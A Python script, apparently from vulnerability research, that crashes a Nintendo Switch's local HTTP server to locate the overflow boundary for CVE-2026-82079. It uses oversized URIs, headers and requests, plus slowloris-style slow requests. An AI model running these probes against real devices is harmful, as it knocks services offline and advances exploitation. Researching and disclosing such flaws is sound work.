#!/usr/bin/env python3
"""
Targeted buffer overflow probing for CVE-2026-82079.

Based on the HTTP server baseline findings:
  - Custom HTTP server (no Server header, Connection: close)
  - Known bugs: double Content-Type on OOB range, range on 404, 403 on data.json
  - Stack-based buffer overflow in LDN local wireless code

This script systematically probes for the stack buffer boundary using
binary search on various input fields. When the server crashes (stops
responding), we've found the buffer size.

Usage:
    1. Put Switch in "Send to Smartphone" mode
    2. Connect PC to the switch_* WiFi AP
    3. Run: python3 -I http_overflow_probe.py [--test URI|HEADER|BODY|ALL]

Evidence saved to ../evidence/overflow_probe/
"""

import socket
import time
import json
import argparse
import sys
from pathlib import Path
from datetime import datetime, timezone

SWITCH_IP = "192.168.0.1"
SWITCH_PORT = 80
TIMEOUT = 3
EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "overflow_probe"


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def raw_send(data: bytes, timeout: float = TIMEOUT) -> tuple[bytes, float, str]:
    """Send raw data, return (response, elapsed, status).
    Status: 'ok', 'timeout', 'refused', 'error'"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    t0 = time.monotonic()
    try:
        sock.connect((SWITCH_IP, SWITCH_PORT))
        sock.sendall(data)
        chunks = []
        while True:
            try:
                d = sock.recv(65536)
                if not d:
                    break
                chunks.append(d)
            except socket.timeout:
                break
        elapsed = time.monotonic() - t0
        resp = b"".join(chunks)
        if resp:
            return resp, elapsed, "ok"
        return resp, elapsed, "empty"
    except ConnectionRefusedError:
        return b"", time.monotonic() - t0, "refused"
    except socket.timeout:
        return b"", time.monotonic() - t0, "timeout"
    except OSError as e:
        return str(e).encode(), time.monotonic() - t0, "error"
    finally:
        sock.close()


def is_alive() -> bool:
    """Check if the HTTP server is responding."""
    req = b"GET /index.html HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n"
    resp, _, status = raw_send(req, timeout=3)
    return status == "ok" and b"200 OK" in resp


def wait_for_recovery(max_wait: float = 30.0) -> bool:
    """Wait for the server to come back after a crash."""
    t0 = time.monotonic()
    while time.monotonic() - t0 < max_wait:
        if is_alive():
            return True
        time.sleep(1)
    return False


def get_status_code(resp: bytes) -> int:
    try:
        return int(resp.split(b" ", 2)[1])
    except (IndexError, ValueError):
        return -1


# ═══════════════════════════════════════════════════════════
# PROBE: URI LENGTH
# ═══════════════════════════════════════════════════════════

def probe_uri_length():
    """Binary search for the URI length that crashes the server."""
    print("\n" + "=" * 50)
    print("PROBE: URI Length Buffer Boundary")
    print("=" * 50)

    results = []
    crash_at = None

    # Phase 1: exponential search to find the ballpark
    print("\nPhase 1: Exponential search")
    sizes = [128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768]

    for size in sizes:
        uri = "/" + "A" * (size - 1)
        req = f"GET {uri} HTTP/1.1\r\nHost: {SWITCH_IP}\r\n\r\n".encode()
        resp, elapsed, status = raw_send(req)
        code = get_status_code(resp) if status == "ok" else -1

        entry = {"size": size, "status": status, "code": code,
                 "elapsed": round(elapsed, 4), "resp_bytes": len(resp)}
        results.append(entry)

        indicator = "✓" if status == "ok" else "✗"
        print(f"  {indicator} URI={size:6d}B → status={status} code={code} ({elapsed:.3f}s)")

        if status != "ok" or code <= 0:
            print(f"    Server stopped responding at URI length {size}")
            crash_at = size
            # Check if truly crashed
            time.sleep(1)
            if not is_alive():
                entry["crash_confirmed"] = True
                print(f"    ✗ CRASH CONFIRMED at {size} bytes")
                recovered = wait_for_recovery()
                entry["recovered"] = recovered
                if recovered:
                    print(f"    ✓ Server recovered")
                else:
                    print(f"    ✗ Server did NOT recover within 30s")
            break

    # Phase 2: binary search if we found a crash
    if crash_at and crash_at > sizes[0]:
        prev_size = sizes[sizes.index(crash_at) - 1] if crash_at in sizes else crash_at // 2
        print(f"\nPhase 2: Binary search between {prev_size} and {crash_at}")

        low, high = prev_size, crash_at
        while high - low > 16:
            if not is_alive():
                print("  Waiting for server recovery...")
                if not wait_for_recovery():
                    print("  Server not recovering. Stopping.")
                    break
                time.sleep(1)

            mid = (low + high) // 2
            uri = "/" + "A" * (mid - 1)
            req = f"GET {uri} HTTP/1.1\r\nHost: {SWITCH_IP}\r\n\r\n".encode()
            resp, elapsed, status = raw_send(req)
            code = get_status_code(resp) if status == "ok" else -1

            entry = {"size": mid, "status": status, "code": code,
                     "elapsed": round(elapsed, 4), "phase": "binary_search"}
            results.append(entry)

            if status == "ok" and code > 0:
                low = mid
                print(f"  ✓ URI={mid:6d}B OK → search [{mid}, {high}]")
            else:
                high = mid
                print(f"  ✗ URI={mid:6d}B FAIL → search [{low}, {mid}]")
                time.sleep(1)

        print(f"\n  Buffer boundary: approximately {low}-{high} bytes")

    summary = {
        "test": "uri_length_probe",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "crash_at": crash_at,
        "results": results,
    }
    path = evidence_dir() / "uri_length.json"
    with open(path, "w") as f:
        json.dump(summary, f, indent=2)
    print(f"\nSaved: {path}")
    return summary


# ═══════════════════════════════════════════════════════════
# PROBE: HEADER VALUE LENGTH
# ═══════════════════════════════════════════════════════════

def probe_header_length():
    """Binary search for header value length that crashes the server."""
    print("\n" + "=" * 50)
    print("PROBE: Header Value Buffer Boundary")
    print("=" * 50)

    headers_to_test = [
        ("Host", "single value parsed by server"),
        ("User-Agent", "often copied to fixed buffer"),
        ("Accept", "parsed but maybe ignored"),
        ("Cookie", "session handling"),
        ("X-Forwarded-For", "proxy header"),
    ]

    all_results = {}

    for hdr_name, reason in headers_to_test:
        print(f"\n  Testing: {hdr_name} ({reason})")
        results = []
        crash_at = None

        sizes = [256, 512, 1024, 2048, 4096, 8192, 16384]
        for size in sizes:
            hdrs = f"Host: {SWITCH_IP}\r\n"
            if hdr_name != "Host":
                hdrs += f"{hdr_name}: {'B' * size}\r\n"
            else:
                hdrs = f"Host: {'B' * size}\r\n"

            req = f"GET /index.html HTTP/1.1\r\n{hdrs}\r\n".encode()
            resp, elapsed, status = raw_send(req)
            code = get_status_code(resp) if status == "ok" else -1

            entry = {"size": size, "status": status, "code": code, "elapsed": round(elapsed, 4)}
            results.append(entry)

            indicator = "✓" if status == "ok" else "✗"
            print(f"    {indicator} {hdr_name}={size:6d}B → status={status} code={code}")

            if status != "ok" or code <= 0:
                crash_at = size
                time.sleep(1)
                if not is_alive():
                    entry["crash_confirmed"] = True
                    print(f"    ✗ CRASH at {hdr_name}={size}B")
                    wait_for_recovery()
                break

        all_results[hdr_name] = {"crash_at": crash_at, "results": results}

    summary = {
        "test": "header_length_probe",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "results": all_results,
    }
    path = evidence_dir() / "header_length.json"
    with open(path, "w") as f:
        json.dump(summary, f, indent=2)
    print(f"\nSaved: {path}")
    return summary


# ═══════════════════════════════════════════════════════════
# PROBE: TOTAL REQUEST SIZE
# ═══════════════════════════════════════════════════════════

def probe_total_request_size():
    """Test total HTTP request size limits (many headers combined)."""
    print("\n" + "=" * 50)
    print("PROBE: Total Request Size Boundary")
    print("=" * 50)

    results = []
    sizes = [1024, 4096, 8192, 16384, 32768, 65536, 131072]

    for target_size in sizes:
        # Build a request with enough X-Pad headers to reach target size
        base = f"GET /index.html HTTP/1.1\r\nHost: {SWITCH_IP}\r\n"
        padding_needed = target_size - len(base) - 4  # -4 for final \r\n\r\n
        num_headers = max(1, padding_needed // 260)  # ~256 value + header overhead
        value_len = max(1, (padding_needed // num_headers) - 20)

        hdrs = base
        for i in range(num_headers):
            hdrs += f"X-P{i:04d}: {'C' * value_len}\r\n"
        hdrs += "\r\n"
        actual_size = len(hdrs.encode())

        resp, elapsed, status = raw_send(hdrs.encode())
        code = get_status_code(resp) if status == "ok" else -1

        entry = {"target_size": target_size, "actual_size": actual_size,
                 "num_headers": num_headers, "status": status, "code": code,
                 "elapsed": round(elapsed, 4)}
        results.append(entry)

        indicator = "✓" if status == "ok" else "✗"
        print(f"  {indicator} total={actual_size:7d}B ({num_headers} hdrs) → status={status} code={code}")

        if status != "ok" or code <= 0:
            time.sleep(1)
            if not is_alive():
                entry["crash_confirmed"] = True
                print(f"  ✗ CRASH at total request size ~{actual_size}B")
                wait_for_recovery()
            break

    summary = {
        "test": "total_request_size_probe",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "results": results,
    }
    path = evidence_dir() / "total_request_size.json"
    with open(path, "w") as f:
        json.dump(summary, f, indent=2)
    print(f"\nSaved: {path}")
    return summary


# ═══════════════════════════════════════════════════════════
# PROBE: SLOW/PARTIAL REQUESTS
# ═══════════════════════════════════════════════════════════

def probe_slow_request():
    """Test server behavior with slow/partial HTTP requests (slowloris-style)."""
    print("\n" + "=" * 50)
    print("PROBE: Slow/Partial Request Handling")
    print("=" * 50)

    results = {}

    # Test 1: Send headers very slowly
    print("\n  Test: Slow header delivery")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((SWITCH_IP, SWITCH_PORT))
        req = b"GET /index.html HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n"
        for i in range(0, len(req), 1):
            sock.send(req[i:i+1])
            time.sleep(0.05)  # 50ms per byte
        resp = b""
        try:
            while True:
                d = sock.recv(4096)
                if not d:
                    break
                resp += d
        except socket.timeout:
            pass
        code = get_status_code(resp)
        results["slow_delivery"] = {"status": "ok" if resp else "empty",
                                    "code": code, "resp_bytes": len(resp)}
        print(f"    Result: code={code} resp={len(resp)}B")
    except Exception as e:
        results["slow_delivery"] = {"status": "error", "error": str(e)}
        print(f"    Error: {e}")
    finally:
        sock.close()

    # Test 2: Send partial request, wait, then complete
    print("  Test: Partial then complete")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((SWITCH_IP, SWITCH_PORT))
        sock.send(b"GET /index.html HTTP/1.1\r\n")
        time.sleep(2)
        sock.send(b"Host: 192.168.0.1\r\n\r\n")
        resp = b""
        try:
            while True:
                d = sock.recv(4096)
                if not d:
                    break
                resp += d
        except socket.timeout:
            pass
        code = get_status_code(resp)
        results["partial_then_complete"] = {"status": "ok" if resp else "empty",
                                            "code": code, "resp_bytes": len(resp)}
        print(f"    Result: code={code} resp={len(resp)}B")
    except Exception as e:
        results["partial_then_complete"] = {"status": "error", "error": str(e)}
        print(f"    Error: {e}")
    finally:
        sock.close()

    # Test 3: Send headers but never the final \r\n — how long until timeout?
    print("  Test: Incomplete request (no final CRLF)")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    try:
        sock.connect((SWITCH_IP, SWITCH_PORT))
        t0 = time.monotonic()
        sock.send(b"GET /index.html HTTP/1.1\r\nHost: 192.168.0.1\r\n")
        # Don't send final \r\n — wait for server to timeout
        try:
            resp = sock.recv(4096)
            elapsed = time.monotonic() - t0
            results["incomplete_request"] = {
                "server_timeout": round(elapsed, 2),
                "resp_bytes": len(resp),
            }
            print(f"    Server responded after {elapsed:.1f}s ({len(resp)}B)")
        except socket.timeout:
            elapsed = time.monotonic() - t0
            results["incomplete_request"] = {
                "server_timeout": f">{elapsed:.0f}s",
                "resp_bytes": 0,
            }
            print(f"    Server held connection open >{elapsed:.0f}s")
    except Exception as e:
        results["incomplete_request"] = {"status": "error", "error": str(e)}
        print(f"    Error: {e}")
    finally:
        sock.close()

    summary = {
        "test": "slow_request_probe",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "results": results,
    }
    path = evidence_dir() / "slow_request.json"
    with open(path, "w") as f:
        json.dump(summary, f, indent=2)
    print(f"\nSaved: {path}")
    return summary


def main():
    parser = argparse.ArgumentParser(description="CVE-2026-82079 buffer overflow probing")
    parser.add_argument("--test", choices=["uri", "header", "body", "slow", "all"],
                        default="all", help="Which probe to run")
    args = parser.parse_args()

    print("CVE-2026-82079 Buffer Overflow Probe")
    print(f"Target: {SWITCH_IP}:{SWITCH_PORT}")
    print(f"Time: {datetime.now(timezone.utc).isoformat()}")
    print("-" * 50)

    if not is_alive():
        print("✗ Switch HTTP server not reachable.")
        print("  Ensure Switch is in Album → Send to Smartphone mode")
        print("  and PC is connected to switch_* WiFi.")
        sys.exit(1)
    print("✓ Server alive")

    if args.test in ("uri", "all"):
        probe_uri_length()
    if args.test in ("header", "all"):
        probe_header_length()
    if args.test in ("body", "all"):
        probe_total_request_size()
    if args.test in ("slow", "all"):
        probe_slow_request()

    print("\n" + "=" * 50)
    print("All probes complete. Check evidence/overflow_probe/")
    print("=" * 50)


if __name__ == "__main__":
    main()
